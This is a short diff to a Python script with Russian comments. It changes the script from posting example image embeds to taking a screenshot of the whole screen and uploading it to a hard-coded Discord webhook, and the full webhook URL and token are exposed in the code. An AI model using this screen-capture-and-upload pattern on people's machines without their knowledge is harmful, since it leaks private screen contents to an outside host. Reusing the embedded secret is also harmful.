@@ -1,24 +1,23 @@
-from discord_webhook import DiscordWebhook, DiscordEmbed
+import pyautogui
+import datetime
+from discord_webhook import DiscordWebhook
 
+# Сделать скриншот
+screenshot_path = "screenshot.png"
+pyautogui.screenshot(screenshot_path)
+
+# Время создания скриншота
+now = datetime.datetime.now().strftime("%d.%m.%Y %H:%M:%S")
+description = f"Скриншот сделан: {now}"
+
+# Отправка в Discord
 webhook = DiscordWebhook(
     url="https://discord.com/api/webhooks/1392514465240580195/KYzEZHcGEwSmJyLlxuP9STfaKh2yVUmM4OCzBMamn2-RQZ2rYQgIO69IbDUopA7nb1UG",
-    username="Калл"
+    username="Калл",
+    content=description
 )
 
-# Пример URL картинок
-image_url1 = "https://example.com/image1.jpg"
-image_url2 = "https://example.com/image2.jpg"
+with open(screenshot_path, "rb") as f:
+    webhook.add_file(file=f.read(), filename="screenshot.png")
 
-# Встраиваем изображения как embed
-embed1 = DiscordEmbed(title="Картинка 1", color="03b2f8")
-embed1.set_image(url=image_url1)
-
-embed2 = DiscordEmbed(title="Картинка 2", color="03b2f8")
-embed2.set_image(url=image_url2)
-
-# Добавляем embeds в webhook
-webhook.add_embed(embed1)
-webhook.add_embed(embed2)
-
-# Отправляем
 response = webhook.execute()
